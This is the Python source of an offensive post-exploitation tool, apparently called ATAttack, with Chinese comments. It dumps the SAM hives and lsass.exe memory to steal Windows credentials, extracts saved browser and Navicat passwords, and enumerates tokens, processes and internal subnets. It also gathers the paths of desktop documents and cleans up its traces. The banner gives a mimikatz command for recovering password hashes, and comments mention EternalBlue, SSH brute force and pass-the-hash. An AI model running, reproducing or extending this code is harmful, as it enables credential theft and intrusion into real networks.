#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-

from ATAttack.enumeration.host import *
from ATAttack.credentials.check import ipadders, attak
from ATAttack.enumeration.tasklist import disk
from ATAttack.enumeration.tasklist import tasklist,token
from ATAttack.enumeration.connect import login_
from ATAttack.framework.constant import constant
from ATAttack.credentials.dump import samdump
from ATAttack.framework.prints import *
from ATAttack.enumeration.check import *
import fnmatch
#import sys
import re
from urllib.parse import urlparse
import argparse
#import wget

ipadder_list = []

class Credentials:
    def __init__(self, host, username, password):
        self.host = host
        self.username = username
        self.password = password
        if self.username is None:
            self.username = 'anonymous'

class exploit:

    def __init__(self, list,_server):
        self.list = list
        self.ftp = _server

    def cmd(self, list):
        for i in list:
            ret = os.popen(i).read()
            ipadder_list.append(ret.encode('utf-8').strip())
        ip = re.findall(
            r'1(?:\d{1,3}\.){3}\d{1,3}(?![\.\d])',
            str(ipadder_list),
            re.S)
        iplist = []
        for ipaddr in ip:
            ipadder = ipaddr.split(
                '.')[0] + '.' + ipaddr.split('.')[1] + '.' + ipaddr.split('.')[2]
            iplist.append(ipadder)
        return iplist

    def pings(self):
        #内网主机icmp探活

        list = []
        ipadder = (set(self.cmd(constant.cmdlist)))
        aparagraph = [x + ".1" for x in ipadder]
        bparagraph = [x + ".254" for x in ipadder]
        aparagraph.extend(bparagraph)
        for add in aparagraph:
            if ipadders().is_internal_ip(add):
                list.append(add)
        print_info("获取网络地址:")
        regex = set(ipfind(list))
        return regex

    def ipcidr(self):
        """
        # 主机注册表sam 解密ntlm
        # 获取lsass.exe进程pid 使用Minidump导出
        # ssh 弱口令爆破  ms17010永恒之蓝 pth哈希彻底攻击
        """
        ddump = samdump()
        sanmdump = ddump.save_hives()
        print_success(
            "成功导出SAM :{}".format(sanmdump))
        llsassdump = ddump.lsassdump()
        print_success(
            "成功导出 lsass.exe 进程:{}".format(llsassdump))
        _att = attak()
        for network in self.pings():
            print_warning("发现的网络地址段 :" + network )

    def history(self,path=None):
        '''
        主流浏览器历史记录，保存密码导出
        '''
        print_success("尝试从历史记录获取密码：")
        chosenEnums = [Chromelog,ielog,firefoxlog,jishulog,Navicat]
        command_list_queue = multiprocessing.Manager().list()
        enums = [enum(q=command_list_queue,w=path) for enum in chosenEnums]
        for enum in enums:
            enum.start()
        for enum in enums:
            enum.join()
        log_tmp = list(set(command_list_queue))
        for url in log_tmp:
            url_change = urlparse(url)
            host = url_change.netloc
            ipadder_list.append(host)

class information():
    @staticmethod
    def run():
        if len(disk()) == 1:
            print_warning("仅存在一个盘符，不收集敏感文件！")
            #exit()
            return
        print_success('获取当前执行进程：' + str(tasklist()))
        login_().rdplogin_()
        print_success("委派令牌可用：" + "\n"  + str(token()))
        dir = os.path.join(os.path.expanduser("~"), 'Desktop') + '\\'
        print_warning('尝试获取系统敏感文件中')
        file = ['*.pdf', '*.doc', '*.docx', '*.ppt', '*.pptx', "*.xlsx", "*.rtf", "*.csv",'*.txt']
        f = open(constant.tmp_name_, 'w')
        for root, dirs, files in os.walk(dir):
            for name in files:
                for file_ in file:
                    if fnmatch.fnmatch(name, file_):
                        f.write(os.path.join(root, name))
                        f.write('\n')
        f.close()

class _start():
    @staticmethod
    def run(_server):
        os.mkdir(constant.upload_dir)
        print_success('创建临时文件夹收集信息 :' + constant.upload_dir)
        ia = information()
        ia.run()
        ig = exploit(constant.cmdlist,_server)
        ig.history(path=constant.upload_dir)
        ig.ipcidr()

    def clean(self):
        try:
            os.system("rd /s/q" + " " + constant.upload_dir)
            print_success("已清除临时文件！")
        except Exception:
            pass
class banner():
    def bprint():
            print(
        """
            ___  _______________   __  __       
   /   |/_  __/_  __/   | / /_/ /_____ ______/ /__
  / /| | / /   / / / /| |/ __/ __/ __ `/ ___/ //_/
 / ___ |/ /   / / / ___ / /_/ /_/ /_/ / /__/ ,<
/_/  |_/_/   /_/ /_/  |_\__/\__/\__,_/\___/_/|_|
author: 1inc50
version: 1.0
ps：导出sam请使用mimikatz输入lsadump::sam /system:system.hive /sam:sam.hive获取所有用户密码hash
        """
    )

if __name__ == '__main__':
    #f=Figlet(font='slant')
    #print(f.renderText('ATTAttack'))
    banner.bprint()
    multiprocessing.freeze_support()
    parse = argparse.ArgumentParser()
    parse.add_argument('-c',dest="clean", help="清除痕迹")
    args = parse.parse_args()
    clean = args.clean

    server = None
    if not args.clean:
        _start().run(server)
    elif args.clean:
        _start().clean()



